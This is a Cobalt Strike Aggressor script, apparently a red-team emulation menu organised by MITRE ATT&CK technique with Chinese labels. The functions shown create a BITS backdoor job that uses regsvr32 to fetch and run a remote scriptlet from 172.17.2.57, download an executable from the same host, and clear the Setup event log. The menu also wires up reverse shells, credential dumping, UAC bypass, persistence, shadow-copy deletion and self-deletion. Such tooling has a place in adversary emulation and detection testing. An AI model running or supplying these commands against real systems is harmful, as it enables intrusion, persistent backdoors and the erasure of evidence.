sub T1197_001_002{
	$shell = "bitsadmin /create backdoor";
	bshell($1,$shell);
	$shell = "bitsadmin /addfile backdoor %comspec%  %temp%\\cmd.exe";
	bshell($1,$shell);
	$shell = "bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe \"/u /s /i:http://172.17.2.57:8080/back.sct scrobj.dll\"";
	bshell($1,$shell);
	$shell = "bitsadmin /Resume backdoor";
	bshell($1,$shell);
	$shell = "bitsadmin /complete backdoor";
	bshell($1,$shell);
}

sub T1197_001_003{
	$shell = "bitsadmin /create transfer";
	bshell($1,$shell);
	$shell = "bitsadmin /transfer transfer /download /priority normal http://172.17.2.57:8080/test.exe c:\\RedTeam\\test.exe";
	bshell($1,$shell);
	$shell = "bitsadmin /RESUME transfer";
	bshell($1,$shell);
	$shell = "bitsadmin /Reset transfer";
	bshell($1,$shell);
	$shell = "bitsadmin /complete transfer";
	bshell($1,$shell);
}

sub T1027_001{
	$shell = "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\csc.exe -help";
	bshell($1,$shell);
	$shell = "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\csc.exe -help";
	bshell($1,$shell);
	$shell = "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -help";
	bshell($1,$shell);
	$shell = "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\csc.exe -help";
	bshell($1,$shell);
	$shell = "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\csc.exe -help";
	bshell($1,$shell);
	$shell = "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe -help";
	bshell($1,$shell);
}

sub T1070_001{
	$shell = "wevtutil cl Setup";
	bshell($1,$shell);
}

popup beacon_bottom {
	menu "RedTeam 测试工具" {
		menu "初始访问"{
			item "Test"{
				btask($1,"\c4hellloworld");
			}
			menu "T1078 | 用户组提升"{
				item "启动"{
					T1078_001($1);
				}
				item "恢复"{
					T1078_001_recover($1);
				}				
			}
		}
		menu "代码执行"{
			item "T1086_002|远程调用PowerShell"{
				T1086_002($1);
			}

			item "T1086_003|PowerShell调用编码命令行"{
				T1086_003($1);
			}

			item "T1086_004|异常调用PowerShell"{
				
			}
			
			item "T1085_001|Rundll32 执行js"{
				T1085_001_method_1($1);
			}

			item "T1085_001|Rundll32 执行vbs"{
				T1085_001_method2($1);
			}

			item "T1085_002|Rundll32加载dll"{
				T1085_002($1);
			}

			menu "T1047|WMI启动"{
				item "WMI启动"{
					btask($1,"\c4*************进行WMI启动**********");
					T1047_001($1);
					btask($1,"\c4********WMI正在启动,测试后需删除**********");
				}
				item "WMI删除"{
					btask($1,"\c4*************进行WMI删除**********");
				T1047_002($1);
				}
			}

			item "T1177|LSA Driver"{
				btask($1,"\c4*************LSA Disver************");
				T1177_001($1);
			}
			
			menu "T1059（暂废）|反弹shell"{
				item "建立ssh连接"{
					btask($1,"\c4**************建立连接**************");
					T1059_dialog($1);
				}
				item "python webshell"{
					btask($1,"\c4**************python攻击***********");
					T1059_001($1);
				}
				item "Perl"{
					btask($1,"\c4**************Perl攻击***********");
					T1059_002($1);
				}
				item "PHP"{
					btask($1,"\c4**************PHP攻击***********");
					T1059_003($1);					
				}
				item "Ruby"{
					btask($1,"\c4**************Ruby攻击***********");
					T1059_004($1);					
				}
				item "NC"{
					btask($1,"\c4**************NC攻击***********");
					T1059_005($1);					
				}
			}

			item "T1117|regsvr32 绕过白名单限制 "{
				btask($1,"\c4************白名单绕过*************");
				T1117_001($1);
			}

			item "T1203|cve2017-11882 检测"{
				btask($1,"\c4************mshta测试*************");
				T1203_001($1);
			}

			item "一键执行所有测试" {
				btask($1, "\c4************一键执行代码执行的所有测试用例************");
				T1086_002($1);
				T1086_003($1);
				T1085_001_method_1($1);
				T1085_002($1);
				T1203_001($1);
				
			}
			item "一键执行所有需管理员权限的测试" {
				$bid = $1[0];
				if (-isadmin $bid){
					btask($1, "\c4************一键执行代码执行的所有管理员权限下的测试用例************");	
					T1047_001($1);
					T1177_001($1);
					T1117_001($1);
					sleep(10);
					T1047_002($1);
				}
				else{
					btask($1,"\c4*******请先提权*******");
				}
			}
		}
		menu "持久化"{
			menu "T1103_001|设置AppInit模块"{
				item "设置"{
					T1103_001($1);
				}
				item "恢复"{
					T1103_001_recover($1);
				}
			}

			item "T1053_001|新建rundll32 计划任务"{
				T1053_001_method1($1);
			}
			item "T1053_001|新建普通计划任务"{
				T1053_001_method2($1);
			}
			menu "T1060_001|注册表启动"{
				item "启动"{
					T1060_001($1);
				}
				item "恢复"{
					T1060_001_recover($1);
				}
					
			}
			item "T1060_002|启动目录启动"{
				T1060_002($1);
			}
		
			menu "T1004_001|设置Winlogon 加载项"{
				item "设置"{
					T1004_001($1);
				}
				item "恢复"{
					T1004_001_recover($1);
				}
			}
			
			menu "T1209 | NTP 服务劫持"{
				item "劫持"{
					T1209_001($1);
				}
				item "恢复"{
					T1209_001_recover($1);
				}
			}

			menu "T1197 | Bits 创建驻留任务"{
				item "method 1"{
					T1197_001_001($1);
				}
				item "method 2"{
					T1197_001_002($1);
				}
				item "method 3"{
					T1197_00_003($1);
				}
							
			}
			item "一键执行所有测试" {
				btask($1, "\c4************一键执行持久化的所有测试用例************");
				T1103_001($1);
				T1053_001_method1($1);
				T1053_001_method2($1);
				T1060_001($1);
				T1004_001($1);
				T1209_001($1);
				T1197_001_001($1);
				T1197_001_002($1);
				T1197_001_003($1);
			}
		}

		menu "权限提升"{
			menu "T1050_001|命令行新建服务" {
				item "启动服务" {
					T1050_001($1);
				}
				item "删除服务" {
					T1050_001_recover($1);
				}
			}
			item "T1088_001|白名单绕过UAC"{
				T1088_001($1);
			}
			menu "T1183_001|映像劫持"{
				item "劫持"{
					T1183_001($1);
				}
				item "恢复"{
					T1183_001_recover($1);
				}
			}
			
			menu "T1015 | 辅助功能测试"{
				item "关闭UAC"{
					T1015_001($1);
				}
				item "进行替换"{
					T1015_002($1);
				}
				item "打开UAC"{
					T1015_003($1);
				}
			}
			

			item "一键执行所有测试" {
				btask($1,"\c4************一键执行所有权限提升的测试用例************");
				T1088_001($1);
				T1183_001($1);
				T1050_001($1);
				T1015_002($1);
			}
		}
		menu "防御绕过"{
			
			
			menu "T1112_002|注册表操作" {
					item "修改" {
					T1112_001_method2($1);
				}
					item "恢复" {
					T1112_001_method2_recover($1);
				}
			
			}
			item "T1036_001|伪装运行" {
				T1036_001($1);
			}
			item "T1090_002|代理转发"{
				T1090_002($1);
			}
			item "T1107_001|自删除"{
				T1107_001($1);
			}
			item "T1036_001|伪装运行" {
				T1036_001_002($1);
			}
			item "T1036_003|伪装运行" {
				T1036_003($1);
			}
			menu "T1036_005|伪装运行" {
				item "直接运行powershell"{
					T1036_005_001($1);
				}
				item "其他路径运行powershell"{
					T1036_005_002($1);
				}
				item "重命名运行powershell"{
					T1036_005_003($1);
				}
			}
			menu "T1562 | 禁用Taskmgr"{
				item "启动禁用"{
					T1562_001($1);
				}
				item "取消禁用"{
					T1562_001_recover($1);
				}
			}
			item "T1027 | csc编译运行"{
				T1027_001($1);
			}
			item "T1070| 清除系统日志"{
				T1070_001($1);
			}

			item "一键执行所有测试" {
				btask($1,"\c4************一键执行所有防御绕过的测试用例************");
				T1112_001_method2($1);
				T1036_002($1);
				T1090_002($1);
				T1107_001($1);
				T1036_005_002($1);
				T1036_005_003($1);
				T1562_001($1);
				T1027_001($1);
			}
		}
		menu "凭据获取"{
			item "T1098_001|新建用户方法1" {
				T1098_001_method1($1);
			}

			item "T1098_001|新建用户方法2" {
				T1098_001_method2($1);
			}

		
			item "T1003_001|凭证转储工具"{
				T1003_001($1);
			}

			item "T1556 | 密码过滤dl"{
				T1556_001($1);
			}

			item "一键执行所有测试"{
				btask($1, "\c4************一键执行所有凭证获取的测试用例************");
				T1098_001_method1($1);
				T1098_001_method2($1);
				T1003_001($1);
				T1556_001($1);
			}
		}
		menu "内部探测"{
			
		}
		menu "横向移动"{
			item "T1175 | dcom 横向移动"{
				T1175_001($1);
			}

		}
		menu "信息收集"{
			
		}
		menu "命令与控制"{
			
		}
		menu "数据窃取"{
			item "T1002 | rar压缩"{
				T1002_001($1);
			}
		}
		menu "影响"{
			item "T1490 | 删除卷影"{
				T1490_001($1);
			}
		}
	}

}